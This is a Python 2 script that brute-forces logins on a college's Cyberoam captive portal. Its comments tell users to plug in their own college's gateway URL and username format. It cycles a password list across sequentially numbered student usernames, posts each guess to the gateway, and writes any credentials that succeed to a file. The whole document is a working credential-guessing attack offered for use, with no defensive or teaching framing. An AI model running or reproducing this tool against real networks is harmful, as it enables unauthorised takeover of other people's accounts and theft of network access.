#Replace the URL in 'get =' to the URL used in your college!
#Replace the user_name(u12me) with the format used in your college!
#You can edit the file passwordlist.txt to add you own custom passwords!
#usernumber_min = Set it to the number where the serial number start. (if u12me001 then set usernumber_min=1)
#usernumber_max = Set it to the number where the serial number start. (if u12me200 then set usernumber_min=200)
#Set the host_url to the cyberoam gateway URL.

import os
import sys
import time
import urllib
import urllib2

user_list = open("userlist.txt","a")
pass_list = open("passwordlist.txt","r")
user_name = "civ15"
host_url = 'http://172.16.1.100:8090/httpclient.html'

def connectivity():
	try:
		print 'Trying to connect to host'
		response=urllib2.urlopen(host_url,timeout=20)
		print 'CONNECTED'
		return True
	except urllib2.URLError as err: pass
	return False

flag = True
usernumber_min = 1
usernumber_max = 70

if connectivity() == True:
	while flag :

		pass_file_read = pass_list.readline()
		#--------------------------------------------------------------------------------
		#--------------------------------------------------------------------------------
		if pass_file_read == '':
			flag = False
			print 'End of File'
			sys.exit()
		#--------------------------------------------------------------------------------
		#--------------------------------------------------------------------------------
		passwd = pass_file_read[:-1]
		print 'Password: ',passwd
		#--------------------------------------------------------------------------------
		#--------------------------------------------------------------------------------
		while usernumber_min <= usernumber_max :
			#----------------------------------------------------------------------------
			#----------------------------------------------------------------------------		
			if usernumber_min <= 9:
				print 'Checking User: ' + user_name + '' + str(usernumber_min)
			elif usernumber_min >= 10 and usernumber_min <= 99 :
				print 'Checking User: ' + user_name + '' + str(usernumber_min)
			else :
				print 'Checking User: ' + user_name + str(usernumber_min)
			#----------------------------------------------------------------------------
			#----------------------------------------------------------------------------
			if usernumber_min <= 9:
				get = urllib.urlopen(host_url,"mode=191&username="+user_name+""+str(usernumber_min)+"&password="+passwd+"&a=1355344698415")			
			elif usernumber_min >= 10 and usernumber_min <= 99 :
				get = urllib.urlopen(host_url,"mode=191&username="+user_name+""+str(usernumber_min)+"&password="+passwd+"&a=1355344698415")			
			else :
				get = urllib.urlopen(host_url,"mode=191&username="+user_name+str(usernumber_min)+"&password="+passwd+"&a=1355344698415")
			#----------------------------------------------------------------------------
			#----------------------------------------------------------------------------
			code = get.readlines(5)
			str1 = code[0]
			return_value = str1.find("in")
			#----------------------------------------------------------------------------
			#----------------------------------------------------------------------------
			if return_value != -1:
				print '--->hurrah new pasword found user name is   Username: ',usernumber_min
				user_list.write('Username: 15'+str(usernumber_min)+' Password:'+passwd)
				user_list.write("\n")
			usernumber_min = usernumber_min  + 1
		
		time.sleep(5)
		usernumber_min = 1
else:
	print 'No connectivity to host'

pass_list.close()
user_list.close()
